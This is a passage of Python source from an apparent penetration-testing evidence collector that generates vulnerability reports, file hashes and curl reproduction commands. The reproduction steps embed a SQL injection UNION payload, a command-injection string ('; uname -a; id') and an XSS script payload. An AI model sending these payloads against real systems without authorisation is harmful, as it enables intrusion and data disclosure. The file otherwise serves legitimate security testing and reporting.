                    'expected_result': 'JavaScript alert should execute, confirming XSS vulnerability'
                }
            ])
        elif vuln_type == 'sqli':
            steps.extend([
                {
                    'step': '3',
                    'title': 'SQL Injection Test',
                    'description': 'Test for SQL injection with error-based payload',
                    'command': f'curl -X GET "{url}?{parameter}={urllib.parse.quote(payload)}"',
                    'expected_result': 'SQL error messages should appear in the response'
                },
                {
                    'step': '4',
                    'title': 'Data Extraction',
                    'description': 'Extract database information using UNION queries',
                    'command': f'curl -X GET "{url}?{parameter}={urllib.parse.quote("\\' UNION SELECT user(),database(),version()--")}"',
                    'expected_result': 'Database user, name, and version should be disclosed'
                }
            ])
        elif vuln_type == 'rce':
            steps.extend([
                {
                    'step': '3',
                    'title': 'Command Injection Test',
                    'description': 'Test for command injection with system commands',
                    'command': f'curl -X GET "{url}?{parameter}={urllib.parse.quote(payload)}"',
                    'expected_result': 'System command output should appear in the response'
                },
                {
                    'step': '4',
                    'title': 'System Information Gathering',
                    'description': 'Gather system information to confirm RCE',
                    'command': f'curl -X GET "{url}?{parameter}={urllib.parse.quote("; uname -a; id")}"',
                    'expected_result': 'System information and user context should be displayed'
                }
            ])
        
        steps.append({
            'step': str(len(steps) + 1),
            'title': 'Impact Assessment',
            'description': 'Assess the security impact of the vulnerability',
            'command': 'Analyze the vulnerability impact based on exploitation results',
            'expected_result': f'Confirm {vulnerability.get("severity", "medium")} severity vulnerability'
        })
        
        return steps
    
    async def _generate_technical_analysis(self, vulnerability: Dict[str, Any]) -> Optional[EvidenceItem]:
        """Generate detailed technical analysis document"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            analysis_path = self.reports_dir / f"{vulnerability['id']}_technical_analysis_{timestamp}.md"
            
            analysis_content = f"""# Technical Vulnerability Analysis

## Executive Summary
**Vulnerability ID**: {vulnerability['id']}
**Title**: {vulnerability.get('title', 'Unknown Vulnerability')}
**Severity**: {vulnerability.get('severity', 'Unknown')}
**CVSS Score**: {vulnerability.get('cvss_score', 'N/A')}
**Discovery Date**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

## Vulnerability Details

### Type
{vulnerability.get('type', 'Unknown').upper()} - {vulnerability.get('description', 'No description available')}

### Affected Component
- **URL**: {vulnerability.get('url', 'N/A')}
- **Parameter**: {vulnerability.get('parameter', 'N/A')}
- **Method**: {vulnerability.get('method', 'GET')}

### Technical Description
{vulnerability.get('technical_description', 'This vulnerability allows an attacker to exploit the application through improper input validation or security controls.')}

## Exploitation Details

### Attack Vector
{vulnerability.get('attack_vector', 'Remote')}

### Payload Used
```
{vulnerability.get('payload', 'N/A')}
```

### HTTP Request
```http
{vulnerability.get('http_request', 'N/A')}
```

### HTTP Response
```http
{vulnerability.get('http_response', 'N/A')}
```

## Impact Analysis

### Confidentiality Impact
{vulnerability.get('confidentiality_impact', 'Medium - Sensitive information may be disclosed')}

### Integrity Impact
{vulnerability.get('integrity_impact', 'Medium - Data may be modified by unauthorized users')}

### Availability Impact
{vulnerability.get('availability_impact', 'Low - Service availability is not significantly affected')}

### Business Impact
{vulnerability.get('business_impact', 'This vulnerability could lead to unauthorized access to sensitive data, potential data breaches, and compromise of user accounts.')}

## Risk Assessment

### Likelihood
{vulnerability.get('likelihood', 'High - The vulnerability is easily exploitable with common tools')}

### Risk Level
{vulnerability.get('risk_level', vulnerability.get('severity', 'Medium'))}

### CVSS v3.1 Vector
{vulnerability.get('cvss_vector', 'N/A')}

## Remediation

### Immediate Actions
1. {vulnerability.get('immediate_action_1', 'Implement input validation and sanitization')}
2. {vulnerability.get('immediate_action_2', 'Apply security patches if available')}
3. {vulnerability.get('immediate_action_3', 'Monitor for exploitation attempts')}

### Long-term Solutions
1. {vulnerability.get('longterm_solution_1', 'Implement comprehensive security controls')}
2. {vulnerability.get('longterm_solution_2', 'Conduct regular security assessments')}
3. {vulnerability.get('longterm_solution_3', 'Provide security training to developers')}

### Code Fix Example
```python
# Before (Vulnerable)
{vulnerability.get('vulnerable_code', 'user_input = request.GET.get("param")')}

# After (Secure)
{vulnerability.get('secure_code', 'user_input = escape(request.GET.get("param", ""))')}
```

## References
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Database](https://cwe.mitre.org/)
- [NIST Vulnerability Database](https://nvd.nist.gov/)
{chr(10).join(f'- {ref}' for ref in vulnerability.get('references', []))}

## Verification Status
**Status**: {vulnerability.get('verification_status', 'Verified')}
**Verification Method**: {vulnerability.get('verification_method', 'Automated + Manual')}
**Verified By**: AEGIS-X Professional Security Scanner
**Verification Date**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

---
*This analysis was generated by AEGIS-X Professional Evidence Collector*
*Report ID: {vulnerability['id']}_analysis_{timestamp}*
"""
            
            with open(analysis_path, 'w') as f:
                f.write(analysis_content)
            
            return EvidenceItem(
                id=self._generate_id(),
                type='document',
                title='Technical Vulnerability Analysis',
                description='Comprehensive technical analysis of the vulnerability',
                file_path=str(analysis_path),
                metadata={
                    'content_type': 'text/markdown',
                    'analysis_type': 'technical',
                    'vulnerability_type': vulnerability.get('type', 'unknown')
                },
                timestamp=datetime.now().isoformat(),
                hash=self._calculate_file_hash(analysis_path),
                size=analysis_path.stat().st_size,
                vulnerability_id=vulnerability['id']
            )
            
        except Exception as e:
            self.logger.error(f"Failed to generate technical analysis: {e}")
            return None
    
    async def _collect_system_evidence(self, vulnerability: Dict[str, Any]) -> List[EvidenceItem]:
        """Collect system and environment evidence"""
        evidence_items = []
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        try:
            # System information
            system_info = {
                'timestamp': datetime.now().isoformat(),
                'scanner': 'AEGIS-X Professional',
                'target_url': vulnerability.get('url', ''),
                'vulnerability_type': vulnerability.get('type', ''),
                'severity': vulnerability.get('severity', ''),
                'discovery_method': vulnerability.get('discovery_method', 'automated'),
                'verification_status': vulnerability.get('verified', False)
            }
            
            system_info_path = self.logs_dir / f"{vulnerability['id']}_system_info_{timestamp}.json"
            with open(system_info_path, 'w') as f:
                json.dump(system_info, f, indent=2)
            
            evidence_items.append(EvidenceItem(
                id=self._generate_id(),
                type='log',
                title='System Information',
                description='System and scanning environment information',
                file_path=str(system_info_path),
                metadata={
                    'content_type': 'application/json',
                    'info_type': 'system'
                },
                timestamp=datetime.now().isoformat(),
                hash=self._calculate_file_hash(system_info_path),
                size=system_info_path.stat().st_size,
                vulnerability_id=vulnerability['id']
            ))
            
            # Target information (if available)
            if vulnerability.get('target_info'):
                target_info_path = self.logs_dir / f"{vulnerability['id']}_target_info_{timestamp}.json"
                with open(target_info_path, 'w') as f:
                    json.dump(vulnerability['target_info'], f, indent=2)
                
                evidence_items.append(EvidenceItem(
                    id=self._generate_id(),
                    type='log',
                    title='Target Information',
                    description='Information about the target system',
                    file_path=str(target_info_path),
                    metadata={
                        'content_type': 'application/json',
                        'info_type': 'target'
                    },
                    timestamp=datetime.now().isoformat(),
                    hash=self._calculate_file_hash(target_info_path),
                    size=target_info_path.stat().st_size,
                    vulnerability_id=vulnerability['id']
                ))
            
        except Exception as e:
            self.logger.error(f"Failed to collect system evidence: {e}")
        
        return evidence_items
    
    def _generate_curl_command(self, vulnerability: Dict[str, Any]) -> str:
        """Generate curl command for manual verification"""
        url = vulnerability.get('url', '')
        parameter = vulnerability.get('parameter', '')
        payload = vulnerability.get('payload', '')
        method = vulnerability.get('method', 'GET').upper()
        
        if not url:
            return ""
        
        if method == 'GET' and parameter and payload:
            encoded_payload = urllib.parse.quote(payload)
            if "?" in url:
                full_url = f"{url}&{parameter}={encoded_payload}"
            else:
                full_url = f"{url}?{parameter}={encoded_payload}"
            
            return f'''curl -X GET \\
  "{full_url}" \\
  -H "User-Agent: AEGIS-X Professional Security Scanner" \\
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \\
  -v \\
  --connect-timeout 10 \\
  --max-time 30'''
        
        elif method == 'POST' and parameter and payload:
            return f'''curl -X POST \\
  "{url}" \\
  -H "User-Agent: AEGIS-X Professional Security Scanner" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "{parameter}={urllib.parse.quote(payload)}" \\
  -v \\
  --connect-timeout 10 \\
  --max-time 30'''
        
        else:
            return f'''curl -X {method} \\
  "{url}" \\
  -H "User-Agent: AEGIS-X Professional Security Scanner" \\
  -v \\
  --connect-timeout 10 \\
  --max-time 30'''
    
    async def _save_evidence_package(self, evidence_package: VulnerabilityEvidence):
        """Save the complete evidence package"""
        try:
            package_path = self.evidence_dir / f"{evidence_package.vulnerability_id}_evidence_package.json"
            
            # Convert to dictionary for JSON serialization
            package_dict = asdict(evidence_package)
            
            with open(package_path, 'w') as f:
                json.dump(package_dict, f, indent=2, default=str)
            
            self.logger.info(f"💾 Evidence package saved: {package_path}")
            
        except Exception as e:
            self.logger.error(f"Failed to save evidence package: {e}")
    
    def _generate_id(self) -> str:
        """Generate unique ID"""
        return f"aegis_{int(time.time())}_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
    
    def _calculate_file_hash(self, file_path: Path) -> str:
        """Calculate SHA-256 hash of a file"""
        try:
            with open(file_path, 'rb') as f:
                return hashlib.sha256(f.read()).hexdigest()
        except Exception:
            return ""

# Example usage
if __name__ == "__main__":
    import asyncio
    
    # Example vulnerability for testing
    test_vulnerability = {
        'id': 'test_vuln_001',
        'title': 'Cross-Site Scripting (XSS)',
        'type': 'xss',
        'severity': 'high',
        'cvss_score': 7.5,
        'url': 'https://example.com/search.php',
        'parameter': 'q',
        'payload': '<script>alert("AEGIS-X-XSS")</script>',
        'description': 'Reflected XSS vulnerability in search parameter',
        'verified': True,
        'exploitable': True
    }
    
    async def test_evidence_collection():
        collector = ProfessionalEvidenceCollector()
        evidence = await collector.collect_comprehensive_evidence(test_vulnerability)
        print(f"Collected {len(evidence.evidence_items)} evidence items")
        for item in evidence.evidence_items:
            print(f"- {item.type}: {item.title}")
    
    # Run test
    # asyncio.run(test_evidence_collection())